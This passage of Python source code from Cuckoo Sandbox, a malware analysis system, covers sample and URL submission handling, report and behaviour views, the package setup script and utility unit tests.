filedata)\n\n            submit[\"data\"].append({\n                \"type\": \"file\",\n                \"data\": filepath\n            })\n            return\n\n        if validate_url(line):\n            submit[\"data\"].append({\n                \"type\": \"url\",\n                \"data\": line\n            })\n            return\n\n        submit[\"errors\"].append(\n            \"'%s' was neither a valid hash or url\" % line\n        )\n\n    def pre(self, submit_type, data):\n        \"\"\"\n        The first step to submitting new analysis.\n        @param submit_type: \"files\" or \"strings\"\n        @param data: a list of dicts containing \"name\" (file name)\n                and \"data\" (file data) or a list of strings (urls or hashes)\n        @return: submit id\n        \"\"\"\n        if submit_type not in (\"strings\", \"files\"):\n            log.error(\"Bad parameter '%s' for submit_type\", submit_type)\n            return False\n\n        path_tmp = Folders.create_temp()\n        submit_data = {\n            \"data\": [],\n            \"errors\": []\n        }\n\n        if submit_type == \"strings\":\n            for line in data:\n                self._handle_string(submit_data, path_tmp, line)\n\n        if submit_type == \"files\":\n            for entry in data:\n                filename = Storage.get_filename_from_path(entry[\"name\"])\n                filepath = Files.create(path_tmp, filename, entry[\"data\"])\n                submit_data[\"data\"].append({\n                    \"type\": \"file\",\n                    \"data\": filepath\n                })\n\n        return Database().add_submit(path_tmp, submit_type, submit_data)\n\n    def get_files(self, submit_id, password=None, astree=False):\n        \"\"\"\n        Returns files from a submitted analysis.\n        @param password: The password to unlock container archives with\n        @param astree: sflock option; determines the format in which the files are returned\n        @return: A tree of files\n        \"\"\"\n        submit = Database().view_submit(submit_id)\n        files, duplicates = [], []\n\n        for data in submit.data[\"data\"]:\n            if data[\"type\"] == \"file\":\n                filename = Storage.get_filename_from_path(data[\"data\"])\n                filepath = os.path.join(submit.tmp_path, filename)\n\n                unpacked = sflock.unpack(\n                    filepath=filepath, password=password, duplicates=duplicates\n                )\n\n                if astree:\n                    unpacked = unpacked.astree(sanitize=True)\n\n                files.append(unpacked)\n            elif data[\"type\"] == \"url\":\n                files.append({\n                    \"filename\": data[\"data\"],\n                    \"filepath\": \"\",\n                    \"relapath\": \"\",\n                    \"selected\": True,\n                    \"size\": 0,\n                    \"type\": \"url\",\n                    \"package\": \"ie\",\n                    \"extrpath\": [],\n                    \"duplicate\": False,\n                    \"children\": [],\n                    \"mime\": \"text/html\",\n                    \"finger\": {\n                        \"magic_human\": \"url\",\n                        \"magic\": \"url\"\n                    }\n                })\n            else:\n                raise RuntimeError(\n                    \"Unknown data entry type: %s\" % data[\"type\"]\n                )\n\n        return files\n\n    def translate_options(self, info, options):\n        \"\"\"Translates Web Interface options to Cuckoo database options.\"\"\"\n        ret = {}\n\n        if not int(options[\"simulated-human-interaction\"]):\n            ret[\"human\"] = int(options[\"simulated-human-interaction\"])\n\n        return emit_options(ret)\n\n    def submit(self, submit_id, config):\n        \"\"\"Reads, interprets, and converts the JSON configuration provided by\n        the Web Interface into something we insert into the database.\"\"\"\n        ret = []\n        submit = db.view_submit(submit_id)\n\n        for entry in config[\"file_selection\"]:\n            # Merge the global & per-file analysis options.\n            info = copy.deepcopy(config[\"global\"])\n            info.update(entry)\n            options = copy.deepcopy(config[\"global\"][\"options\"])\n            options.update(entry.get(\"options\", {}))\n\n            kw = {\n                \"package\": info.get(\"package\"),\n                \"timeout\": info.get(\"timeout\", 120),\n                \"priority\": info.get(\"priority\"),\n                \"custom\": info.get(\"custom\"),\n                \"owner\": info.get(\"owner\"),\n                \"tags\": info.get(\"tags\"),\n                \"memory\": info.get(\"memory\"),\n                \"enforce_timeout\": options.get(\"enforce-timeout\"),\n                \"machine\": info.get(\"machine\"),\n                \"platform\": info.get(\"platform\"),\n                \"options\": self.translate_options(info, options),\n                \"submit_id\": submit_id,\n            }\n\n            if entry[\"type\"] == \"url\":\n                ret.append(db.add_url(\n                    url=info[\"filename\"], **kw\n                ))\n                continue\n\n            # for each selected file entry, create a new temp. folder\n            path_dest = Folders.create_temp()\n\n            if not info[\"extrpath\"]:\n                path = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"filename\"])\n                )\n\n                filepath = Files.copy(path, path_dest=path_dest)\n\n                ret.append(db.add_path(\n                    file_path=filepath, **kw\n                ))\n            elif len(info[\"extrpath\"]) == 1:\n                arcpath = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"arcname\"])\n                )\n                if not os.path.exists(arcpath):\n                    submit.data[\"errors\"].append(\n                        \"Unable to find parent archive file: %s\" %\n                        os.path.basename(info[\"arcname\"])\n                    )\n                    continue\n\n                arc = sflock.zipify(sflock.unpack(\n                    info[\"arcname\"], contents=open(arcpath, \"rb\").read()\n                ))\n\n                # Create a .zip archive out of this container.\n                arcpath = Files.temp_named_put(\n                    arc, os.path.basename(info[\"arcname\"])\n                )\n\n                ret.append(db.add_archive(\n                    file_path=arcpath, filename=info[\"filename\"], **kw\n                ))\n            else:\n                arcpath = os.path.join(\n                    submit.tmp_path, os.path.basename(info[\"arcname\"])\n                )\n                if not os.path.exists(arcpath):\n                    submit.data[\"errors\"].append(\n                        \"Unable to find parent archive file: %s\" %\n                        os.path.basename(info[\"arcname\"])\n                    )\n                    continue\n\n                content = sflock.unpack(arcpath).read(info[\"extrpath\"][:-1])\n                subarc = sflock.unpack(info[\"extrpath\"][-2], contents=content)\n\n                # Write intermediate .zip archive file.\n                arcpath = Files.temp_named_put(\n                    sflock.zipify(subarc),\n                    os.path.basename(info[\"extrpath\"][-2])\n                )\n\n                ret.append(db.add_archive(\n                    file_path=arcpath, filename=info[\"filename\"], **kw\n                ))\n\n        return ret\n/n/n/ncuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.\n# Copyright (C) 2014-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport collections\nimport os\nimport pymongo\n\nfrom django.http import Http404\n\nfrom cuckoo.common.mongo import mongo\nfrom cuckoo.core.database import Database, TASK_PENDING\n\ndb = Database()\n\nclass AnalysisController:\n    @staticmethod\n    def task_info(task_id):\n        if not isinstance(task_id, int):\n            raise Exception(\"Task ID should be integer\")\n\n        task = db.view_task(task_id, details=True)\n        if not task:\n            return Http404(\"Task not found\")\n\n        entry = task.to_dict()\n        entry[\"guest\"] = {}\n        if task.guest:\n            entry[\"guest\"] = task.guest.to_dict()\n\n        entry[\"errors\"] = []\n        for error in task.errors:\n            entry[\"errors\"].append(error.message)\n\n        entry[\"sample\"] = {}\n        if task.sample_id:\n            sample = db.view_sample(task.sample_id)\n            entry[\"sample\"] = sample.to_dict()\n\n        entry[\"target\"] = os.path.basename(entry[\"target\"])\n        return {\n            \"task\": entry,\n        }\n\n    @staticmethod\n    def get_recent(limit=50, offset=0):\n        tasks_files = db.list_tasks(\n            limit=limit,\n            offset=offset,\n            category=\"file\",\n            not_status=TASK_PENDING)\n\n        tasks_urls = db.list_tasks(\n            limit=limit,\n            offset=offset,\n            category=\"url\",\n            not_status=TASK_PENDING)\n\n        data = []\n        if tasks_files:\n            for task in tasks_files:\n                new = task.to_dict()\n                new[\"sample\"] = db.view_sample(new[\"sample_id\"]).to_dict()\n\n                filename = os.path.basename(new[\"target\"])\n                new.update({\"filename\": filename})\n\n                if db.view_errors(task.id):\n                    new[\"errors\"] = True\n\n                data.append(new)\n\n        if tasks_urls:\n            for task in tasks_urls:\n                new = task.to_dict()\n\n                if db.view_errors(task.id):\n                    new[\"errors\"] = True\n\n                data.append(new)\n\n        return data\n\n    @staticmethod\n    def get_report(task_id):\n        report = AnalysisController._get_report(task_id)\n        if not report:\n            raise Http404(\"the specified analysis does not exist\")\n\n        data = {\n            \"analysis\": report\n        }\n\n        dnsinfo = AnalysisController._get_dnsinfo(report)\n        data.update(dnsinfo)\n        return data\n\n    @staticmethod\n    def _get_report(task_id):\n        return mongo.db.analysis.find_one({\n            \"info.id\": int(task_id)\n        }, sort=[(\"_id\", pymongo.DESCENDING)])\n\n    @staticmethod\n    def get_reports(filters):\n        cursor = mongo.db.analysis.find(\n            filters, sort=[(\"_id\", pymongo.DESCENDING)]\n        )\n        return [report for report in cursor]\n\n    @staticmethod\n    def _get_dnsinfo(report):\n        \"\"\"Create DNS information dicts by domain and ip\"\"\"\n\n        if \"network\" in report and \"domains\" in report[\"network\"]:\n            domainlookups = dict((i[\"domain\"], i[\"ip\"]) for i in report[\"network\"][\"domains\"])\n            iplookups = dict((i[\"ip\"], i[\"domain\"]) for i in report[\"network\"][\"domains\"])\n\n            for i in report[\"network\"][\"dns\"]:\n                for a in i[\"answers\"]:\n                    iplookups[a[\"data\"]] = i[\"request\"]\n        else:\n            domainlookups = dict()\n            iplookups = dict()\n\n        return {\n            \"domainlookups\": domainlookups,\n            \"iplookups\": iplookups,\n        }\n\n    @staticmethod\n    def get_behavior(task_id, report=None):\n        \"\"\"\n        Returns behavioral information about an analysis\n        sorted by category (files, registry, mutexes, etc)\n        @param task_id: The analysis ID\n        @param report: JSON analysis blob that is stored in MongoDB (results.json)\n        @return: behavioral information as a dict\n        \"\"\"\n        data = {}\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n        procs = AnalysisController.behavior_get_processes(task_id, report)\n\n        for proc in procs[\"data\"]:\n            pid = proc[\"pid\"]\n            pname = proc[\"process_name\"]\n            pdetails = None\n            for p in report[\"behavior\"][\"generic\"]:\n                if p[\"pid\"] == pid:\n                    pdetails = p\n            if not pdetails:\n                continue\n\n            watchers = AnalysisController.behavior_get_watchers(\n                task_id, pid=pid, report=report)\n\n            for category, events in watchers.iteritems():\n                if not data.has_key(category):\n                    data[category] = {}\n                if not data[category].has_key(pid):\n                    data[category][pname] = {\n                        \"pid\": pid,\n                        \"process_name\": pname,\n                        \"events\": {}\n                    }\n\n                for event in events:\n                    if not data[category][pname][\"events\"].has_key(event):\n                        data[category][pname][\"events\"][event] = []\n                    for _event in pdetails[\"summary\"][event]:\n                        data[category][pname][\"events\"][event].append(_event)\n\n        return data\n\n    @staticmethod\n    def behavior_get_processes(task_id, report=None):\n        if not task_id:\n            raise Exception(\"missing task_id\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        data = {\n            \"data\": [],\n            \"status\": True\n        }\n\n        for process in report.get(\"behavior\", {}).get(\"generic\", []):\n            data[\"data\"].append({\n                \"process_name\": process[\"process_name\"],\n                \"pid\": process[\"pid\"]\n            })\n\n        # sort returning list of processes by their name\n        data[\"data\"] = sorted(data[\"data\"], key=lambda k: k[\"process_name\"])\n\n        return data\n\n    @staticmethod\n    def behavior_get_watchers(task_id, pid, report=None):\n        if not task_id or not pid:\n            raise Exception(\"missing task_id or pid\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        behavior_generic = report[\"behavior\"][\"generic\"]\n        process = [z for z in behavior_generic if z[\"pid\"] == pid]\n\n        if not process:\n            raise Exception(\"missing pid\")\n        else:\n            process = process[0]\n\n        data = {}\n        for category, watchers in AnalysisController.behavioral_mapping().iteritems():\n            for watcher in watchers:\n                if watcher in process[\"summary\"]:\n                    if category not in data:\n                        data[category] = [watcher]\n                    else:\n                        data[category].append(watcher)\n\n        return data\n\n    @staticmethod\n    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):\n        if not task_id or not watcher or not pid:\n            raise Exception(\"missing task_id, watcher, and/or pid\")\n        if not report:\n            report = AnalysisController.get_report(task_id)[\"analysis\"]\n\n        behavior_generic = report[\"behavior\"][\"generic\"]\n        process = [z for z in behavior_generic if z[\"pid\"] == pid]\n\n        if not process:\n            raise Exception(\"supplied pid not found\")\n        else:\n            process = process[0]\n\n        summary = process[\"summary\"]\n\n        if watcher not in summary:\n            raise Exception(\"supplied watcher not found\")\n        if offset:\n            summary[watcher] = summary[watcher][offset:]\n        if limit:\n            summary[watcher] = summary[watcher][:limit]\n\n        return summary[watcher]\n\n    @staticmethod\n    def behavioral_mapping():\n        return {\n            \"files\":\n                [\"file_opened\", \"file_read\"],\n            \"registry\":\n                [\"regkey_opened\", \"regkey_written\", \"regkey_read\"],\n            \"mutexes\":\n                [\"mutex\"],\n            \"directories\":\n                [\"directory_created\", \"directory_removed\", \"directory_enumerated\"],\n            \"processes\":\n                [\"command_line\", \"dll_loaded\"],\n        }\n\n    @staticmethod\n    def signatures(task_id, signatures=None):\n        \"\"\"Returns an OrderedDict containing a lists with signatures based on severity\"\"\"\n        if not task_id:\n            raise Exception(\"missing task_id\")\n        if not signatures:\n            signatures = AnalysisController.get_report(task_id)[\"signatures\"]\n\n        data = collections.OrderedDict()\n        for signature in signatures:\n            severity = signature[\"severity\"]\n            if severity > 3:\n                severity = 3\n            if not data.has_key(severity):\n                data[severity] = []\n            data[severity].append(signature)\n        return data\n/n/n/ncuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.\n# Copyright (C) 2014-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport json\n\nfrom django.http import JsonResponse\nfrom django.shortcuts import redirect\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.views.decorators.http import require_http_methods\n\nfrom cuckoo.common.config import config\nfrom cuckoo.core.submit import SubmitManager\nfrom cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response\n\nsubmit_manager = SubmitManager()\n\ndef defaults():\n    machinery = config(\"cuckoo:cuckoo:machinery\")\n\n    if config(\"routing:vpn:enabled\"):\n        vpns = config(\"routing:vpn:vpns\")\n    else:\n        vpns = []\n\n    return {\n        \"machine\": config(\"%s:%s:machines\" % (machinery, machinery)),\n        \"package\": None,\n        \"priority\": 2,\n        \"timeout\": config(\"cuckoo:timeouts:default\"),\n        \"routing\": {\n            \"route\": config(\"routing:routing:route\"),\n            \"inetsim\": config(\"routing:inetsim:enabled\"),\n            \"tor\": config(\"routing:tor:enabled\"),\n            \"vpns\": vpns,\n        },\n        \"options\": {\n            \"enable-services\": False,\n            \"enforce-timeout\": False,\n            \"full-memory-dump\": config(\"cuckoo:cuckoo:memory_dump\"),\n            \"no-injection\": False,\n            \"process-memory-dump\": True,\n            \"simulated-human-interaction\": True,\n        },\n    }\n\nclass SubmissionApi(object):\n    @staticmethod\n    @csrf_exempt\n    @require_http_methods([\"POST\"])\n    def presubmit(request):\n        files = request.FILES.getlist(\"files[]\")\n        data = []\n\n        if files:\n            for f in files:\n                data.append({\n                    \"name\": f.name,\n                    \"data\": f.file,\n                })\n\n            submit_id = submit_manager.pre(submit_type=\"files\", data=data)\n            return redirect(\"submission/pre\", submit_id=submit_id)\n        else:\n            body = json.loads(request.body)\n            submit_type = body[\"type\"]\n\n            if submit_type != \"strings\":\n                return json_error_response(\"type not \\\"strings\\\"\")\n\n            submit_id = submit_manager.pre(\n                submit_type=submit_type, data=body[\"data\"].split(\"\\n\")\n            )\n\n            return JsonResponse({\n                \"status\": True,\n                \"submit_id\": submit_id,\n            }, encoder=JsonSerialize)\n\n    @api_post\n    def get_files(request, body):\n        submit_id = body.get(\"submit_id\", 0)\n        password = body.get(\"password\", None)\n        astree = body.get(\"astree\", True)\n\n        files = submit_manager.get_files(\n            submit_id=submit_id,\n            password=password,\n            astree=astree\n        )\n\n        return JsonResponse({\n            \"status\": True,\n            \"files\": files,\n            \"defaults\": defaults(),\n        }, encoder=JsonSerialize)\n\n    @api_post\n    def submit(request, body):\n        submit_id = body.pop(\"submit_id\", None)\n        submit_manager.submit(\n            submit_id=submit_id, config=body\n        )\n        return JsonResponse({\n            \"status\": True,\n            \"submit_id\": submit_id,\n        }, encoder=JsonSerialize)\n/n/n/nsetup.py/n/n#!/usr/bin/env python\n# Copyright (C) 2016-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - https://cuckoosandbox.org/.\n# See the file 'docs/LICENSE' for copying permission.\n\nimport os\nimport setuptools\nimport sys\n\n# Update the MANIFEST.in file to include the one monitor version that is\n# actively shipped for this distribution and exclude all the other monitors\n# that we have lying around. Note: I tried to do this is in a better manner\n# through exclude_package_data, but without much luck.\n\nexcl, monitor = [], os.path.join(\"cuckoo\", \"data\", \"monitor\")\nlatest = open(os.path.join(monitor, \"latest\"), \"rb\").read().strip()\nfor h in os.listdir(monitor):\n    if h != \"latest\" and h != latest:\n        excl.append(\n            \"recursive-exclude cuckoo/data/monitor/%s *  # AUTOGENERATED\" % h\n        )\n\nif not os.path.isdir(os.path.join(monitor, latest)) and \\\n        not os.environ.get(\"ONLYINSTALL\"):\n    sys.exit(\n        \"Failure locating the monitoring binaries that belong to the latest \"\n        \"monitor release. Please include those to create a distribution.\"\n    )\n\nmanifest = []\nfor line in open(\"MANIFEST.in\", \"rb\"):\n    if not line.strip() or \"# AUTOGENERATED\" in line:\n        continue\n\n    manifest.append(line.strip())\n\nmanifest.extend(excl)\n\nopen(\"MANIFEST.in\", \"wb\").write(\"\\n\".join(manifest) + \"\\n\")\n\ndef githash():\n    \"\"\"Extracts the current Git hash.\"\"\"\n    git_head = os.path.join(\".git\", \"HEAD\")\n    if os.path.exists(git_head):\n        head = open(git_head, \"rb\").read().strip()\n        if not head.startswith(\"ref: \"):\n            return head\n\n        git_ref = os.path.join(\".git\", head.split()[1])\n        if os.path.exists(git_ref):\n            return open(git_ref, \"rb\").read().strip()\n\ncwd_path = os.path.join(\"cuckoo\", \"data-private\", \".cwd\")\nopen(cwd_path, \"wb\").write(githash() or \"\")\n\ninstall_requires = []\n\n# M2Crypto relies on swig being installed. We also don't support the latest\n# version of SWIG. We should be replacing M2Crypto by something else when\n# the time allows us to do so.\nif os.path.exists(\"/usr/bin/swig\"):\n    install_requires.append(\"m2crypto==0.24.0\")\n\nsetuptools.setup(\n    name=\"Cuckoo\",\n    version=\"2.0.0\",\n    author=\"Stichting Cuckoo Foundation\",\n    author_email=\"cuckoo@cuckoofoundation.org\",\n    packages=[\n        \"cuckoo\",\n    ],\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        # TODO: should become stable.\n        # \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Flask\",\n        \"Framework :: Pytest\",\n        \"Intended Audience :: Information Technology\",\n        \"Intended Audience :: Science/Research\",\n        \"Natural Language :: English\",\n        \"License :: OSI Approved :: GNU General Public License v3 (GPLv3)\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Topic :: Security\",\n    ],\n    url=\"https://cuckoosandbox.org/\",\n    license=\"GPLv3\",\n    description=\"Automated Malware Analysis System\",\n    include_package_data=True,\n    entry_points={\n        \"console_scripts\": [\n            \"cuckoo = cuckoo.main:main\",\n        ],\n    },\n    install_requires=[\n        \"alembic==0.8.8\",\n        \"androguard==3.0\",\n        \"beautifulsoup4==4.4.1\",\n        \"chardet==2.3.0\",\n        \"click==6.6\",\n        \"django==1.8.4\",\n        \"django_extensions==1.6.7\",\n        \"dpkt==1.8.7\",\n        \"elasticsearch==2.2.0\",\n        \"flask==0.10.1\",\n        \"httpreplay==0.1.18\",\n        \"jinja2==2.8\",\n        \"jsbeautifier==1.6.2\",\n        \"lxml==3.6.0\",\n        \"oletools==0.42\",\n        \"peepdf==0.3.2\",\n        \"pefile2==1.2.11\",\n        \"pillow==3.2\",\n        \"pymisp==2.4.54\",\n        \"pymongo==3.0.3\",\n        \"python-dateutil==2.4.2\",\n        \"python-magic==0.4.12\",\n        \"sflock==0.2.5\",\n        \"sqlalchemy==1.0.8\",\n        \"wakeonlan==0.2.2\",\n    ] + install_requires,\n    extras_require={\n        \":sys_platform == 'win32'\": [\n            \"requests==2.7.0\",\n        ],\n        \":sys_platform == 'darwin'\": [\n            \"requests==2.7.0\",\n        ],\n        \":sys_platform == 'linux2'\": [\n            \"requests[security]==2.7.0\",\n            \"scapy==2.3.2\",\n        ],\n        \"distributed\": [\n            \"flask-sqlalchemy==2.1\",\n            \"gevent==1.1.1\",\n            \"psycopg2==2.6.2\",\n        ],\n        \"postgresql\": [\n            \"psycopg2==2.6.2\",\n        ],\n    },\n    setup_requires=[\n        \"pytest-runner\",\n    ],\n    tests_require=[\n        \"coveralls\",\n        \"pytest\",\n        \"pytest-cov\",\n        \"pytest-django\",\n        \"pytest-pythonpath\",\n        \"flask-sqlalchemy==2.1\",\n        \"mock==2.0.0\",\n        \"responses==0.5.1\",\n    ],\n)\n/n/n/ntests/test_utils.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.\n# Copyright (C) 2014-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport cStringIO\nimport io\nimport mock\nimport os\nimport pytest\nimport shutil\nimport tempfile\n\nimport cuckoo\n\nfrom cuckoo.common.exceptions import CuckooOperationalError\nfrom cuckoo.common.files import Folders, Files, Storage, temppath\nfrom cuckoo.common import utils\nfrom cuckoo.misc import set_cwd\n\nclass TestCreateFolders:\n    def setup(self):\n        self.tmp_dir = tempfile.gettempdir()\n\n    def test_root_folder(self):\n        \"\"\"Tests a single folder creation based on the root parameter.\"\"\"\n        Folders.create(os.path.join(self.tmp_dir, \"foo\"))\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        os.rmdir(os.path.join(self.tmp_dir, \"foo\"))\n\n    def test_single_folder(self):\n        \"\"\"Tests a single folder creation.\"\"\"\n        Folders.create(self.tmp_dir, \"foo\")\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        os.rmdir(os.path.join(self.tmp_dir, \"foo\"))\n\n    def test_multiple_folders(self):\n        \"\"\"Tests multiple folders creation.\"\"\"\n        Folders.create(self.tmp_dir, [\"foo\", \"bar\"])\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        assert os.path.exists(os.path.join(self.tmp_dir, \"bar\"))\n        os.rmdir(os.path.join(self.tmp_dir, \"foo\"))\n        os.rmdir(os.path.join(self.tmp_dir, \"bar\"))\n\n    def test_copy_folder(self):\n        \"\"\"Tests recursive folder copy\"\"\"\n        dirpath = tempfile.mkdtemp()\n        set_cwd(dirpath)\n\n        Folders.copy(\"tests/files/sample_analysis_storage\", dirpath)\n        assert os.path.isfile(\"%s/reports/report.json\" % dirpath)\n\n    def test_duplicate_folder(self):\n        \"\"\"Tests a duplicate folder creation.\"\"\"\n        Folders.create(self.tmp_dir, \"foo\")\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        Folders.create(self.tmp_dir, \"foo\")\n        os.rmdir(os.path.join(self.tmp_dir, \"foo\"))\n\n    def test_delete_folder(self):\n        \"\"\"Tests folder deletion #1.\"\"\"\n        Folders.create(self.tmp_dir, \"foo\")\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        Folders.delete(os.path.join(self.tmp_dir, \"foo\"))\n        assert not os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n\n    def test_delete_folder2(self):\n        \"\"\"Tests folder deletion #2.\"\"\"\n        Folders.create(self.tmp_dir, \"foo\")\n        assert os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n        Folders.delete(self.tmp_dir, \"foo\")\n        assert not os.path.exists(os.path.join(self.tmp_dir, \"foo\"))\n\n    def test_create_temp(self):\n        \"\"\"Test creation of temporary directory.\"\"\"\n        dirpath1 = Folders.create_temp(\"/tmp\")\n        dirpath2 = Folders.create_temp(\"/tmp\")\n        assert os.path.exists(dirpath1)\n        assert os.path.exists(dirpath2)\n        assert dirpath1 != dirpath2\n\n    def test_create_temp_conf(self):\n        \"\"\"Test creation of temporary directory with configuration.\"\"\"\n        dirpath = tempfile.mkdtemp()\n        set_cwd(dirpath)\n\n        Folders.create(dirpath, \"conf\")\n        with open(os.path.join(dirpath, \"conf\", \"cuckoo.conf\"), \"wb\") as f:\n            f.write(\"[cuckoo]\\ntmppath = %s\" % dirpath)\n\n        dirpath2 = Folders.create_temp()\n        assert dirpath2.startswith(os.path.join(dirpath, \"cuckoo-tmp\"))\n\n    @pytest.mark.skipif(\"sys.platform != 'linux2'\")\n    def test_create_invld_linux(self):\n        \"\"\"Test creation of a folder we can't access.\"\"\"\n        with pytest.raises(CuckooOperationalError):\n            Folders.create(\"/invalid/directory\")\n\n    @pytest.mark.skipif(\"sys.platform != 'win32'\")\n    def test_create_invld_windows(self):\n        \"\"\"Test creation of a folder we can't access.\"\"\"\n        with pytest.raises(CuckooOperationalError):\n            Folders.create(\"Z:\\\\invalid\\\\directory\")\n\n    def test_delete_invld(self):\n        \"\"\"Test deletion of a folder we can't access.\"\"\"\n        dirpath = tempfile.mkdtemp()\n\n        os.chmod(dirpath, 0)\n        with pytest.raises(CuckooOperationalError):\n            Folders.delete(dirpath)\n\n        os.chmod(dirpath, 0775)\n        Folders.delete(dirpath)\n\n    def test_create_tuple(self):\n        dirpath = tempfile.mkdtemp()\n        Folders.create(dirpath, \"a\")\n        Folders.create((dirpath, \"a\"), \"b\")\n        Files.create((dirpath, \"a\", \"b\"), \"c.txt\", \"nested\")\n\n        filepath = os.path.join(dirpath, \"a\", \"b\", \"c.txt\")\n        assert open(filepath, \"rb\").read() == \"nested\"\n\nclass TestCreateFile:\n    def test_temp_file(self):\n        filepath1 = Files.temp_put(\"hello\", \"/tmp\")\n        filepath2 = Files.temp_put(\"hello\", \"/tmp\")\n        assert open(filepath1, \"rb\").read() == \"hello\"\n        assert open(filepath2, \"rb\").read() == \"hello\"\n        assert filepath1 != filepath2\n\n    def test_create(self):\n        dirpath = tempfile.mkdtemp()\n        Files.create(dirpath, \"a.txt\", \"foo\")\n        assert open(os.path.join(dirpath, \"a.txt\"), \"rb\").read() == \"foo\"\n        shutil.rmtree(dirpath)\n\n    def test_named_temp(self):\n        filepath = Files.temp_named_put(\"test\", \"hello.txt\", \"/tmp\")\n        assert open(filepath, \"rb\").read() == \"test\"\n        assert os.path.basename(filepath) == \"hello.txt\"\n\n    def test_temp_conf(self):\n        dirpath = tempfile.mkdtemp()\n        set_cwd(dirpath)\n\n        Folders.create(dirpath, \"conf\")\n        with open(os.path.join(dirpath, \"conf\", \"cuckoo.conf\"), \"wb\") as f:\n            f.write(\"[cuckoo]\\ntmppath = %s\" % dirpath)\n\n        filepath = Files.temp_put(\"foo\")\n        assert filepath.startswith(os.path.join(dirpath, \"cuckoo-tmp\"))\n\n    def test_stringio(self):\n        filepath = Files.temp_put(cStringIO.StringIO(\"foo\"), \"/tmp\")\n        assert open(filepath, \"rb\").read() == \"foo\"\n\n    def test_bytesio(self):\n        filepath = Files.temp_put(io.BytesIO(\"foo\"), \"/tmp\")\n        assert open(filepath, \"rb\").read() == \"foo\"\n\n    def test_create_bytesio(self):\n        dirpath = tempfile.mkdtemp()\n        filepath = Files.create(dirpath, \"a.txt\", io.BytesIO(\"A\"*1024*1024))\n        assert open(filepath, \"rb\").read() == \"A\"*1024*1024\n\n    def test_hash_file(self):\n        filepath = Files.temp_put(\"hehe\", \"/tmp\")\n        assert Files.md5_file(filepath) == \"529ca8050a00180790cf88b63468826a\"\n        assert Files.sha1_file(filepath) == \"42525bb6d3b0dc06bb78ae548733e8fbb55446b3\"\n        assert Files.sha256_file(filepath) == \"0ebe2eca800cf7bd9d9d9f9f4aafbc0c77ae155f43bbbeca69cb256a24c7f9bb\"\n\n    def test_create_tuple(self):\n        dirpath = tempfile.mkdtemp()\n        Folders.create(dirpath, \"foo\")\n        Files.create((dirpath, \"foo\"), \"a.txt\", \"bar\")\n\n        filepath = os.path.join(dirpath, \"foo\", \"a.txt\")\n        assert open(filepath, \"rb\").read() == \"bar\"\n\n    def test_fd_exhaustion(self):\n        fd, filepath = tempfile.mkstemp()\n\n        for x in xrange(0x100):\n            Files.temp_put(\"foo\")\n\n        fd2, filepath = tempfile.mkstemp()\n\n        # Let's leave a bit of working space.\n        assert fd2 - fd < 64\n\nclass TestStorage:\n    def test_basename(self):\n        assert Storage.get_filename_from_path(\"C:\\\\a.txt\") == \"a.txt\"\n        assert Storage.get_filename_from_path(\"C:/a.txt\") == \"a.txt\"\n        assert Storage.get_filename_from_path(\"C:\\\\\\x00a.txt\") == \"\\x00a.txt\"\n        assert Storage.get_filename_from_path(\"/tmp/a.txt\") == \"a.txt\"\n        assert Storage.get_filename_from_path(\"../../b.txt\") == \"b.txt\"\n        assert Storage.get_filename_from_path(\"..\\\\..\\\\c.txt\") == \"c.txt\"\n\nclass TestConvertChar:\n    def test_utf(self):\n        assert \"\\\\xe9\", utils.convert_char(u\"\\xe9\")\n\n    def test_digit(self):\n        assert \"9\" == utils.convert_char(u\"9\")\n\n    def test_literal(self):\n        assert \"e\" == utils.convert_char(\"e\")\n\n    def test_punctation(self):\n        assert \".\" == utils.convert_char(\".\")\n\n    def test_whitespace(self):\n        assert \" \" == utils.convert_char(\" \")\n\nclass TestConvertToPrintable:\n    def test_utf(self):\n        assert \"\\\\xe9\" == utils.convert_to_printable(u\"\\xe9\")\n\n    def test_digit(self):\n        assert \"9\" == utils.convert_to_printable(u\"9\")\n\n    def test_literal(self):\n        assert \"e\" == utils.convert_to_printable(\"e\")\n\n    def test_punctation(self):\n        assert \".\" == utils.convert_to_printable(\".\")\n\n    def test_whitespace(self):\n        assert \" \" == utils.convert_to_printable(\" \")\n\n    def test_non_printable(self):\n        assert r\"\\x0b\" == utils.convert_to_printable(chr(11))\n\nclass TestIsPrintable:\n    def test_utf(self):\n        assert not utils.is_printable(u\"\\xe9\")\n\n    def test_digit(self):\n        assert utils.is_printable(u\"9\")\n\n    def test_literal(self):\n        assert utils.is_printable(\"e\")\n\n    def test_punctation(self):\n        assert utils.is_printable(\".\")\n\n    def test_whitespace(self):\n        assert utils.is_printable(\" \")\n\n    def test_non_printable(self):\n        assert not 